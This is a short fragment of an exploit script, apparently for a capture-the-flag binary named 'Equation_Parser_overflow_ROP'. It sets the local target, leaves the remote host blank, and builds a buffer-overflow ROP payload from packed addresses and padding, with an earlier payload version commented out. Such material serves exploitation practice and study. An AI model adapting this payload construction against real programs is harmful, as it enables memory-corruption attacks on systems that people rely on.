...
DEBUG = 1
target = "./Equation_Parser_overflow_ROP"
remote_ip = ""
port = 0
...
# payload = p32(0x41424344)+"a"*(0x109-0x14)+p32(0)+p32(0)+p32(0)+"a"*0xc+p32(0x78777675)+p32(0x080eb060)
# payload += "a"*(0x109-len(payload))
payload  = p32(0x41424344)+"a"*(0x105)+p32(0)+p32(0x78777675)+p32(0x080f0060)+p32(0x1f4)
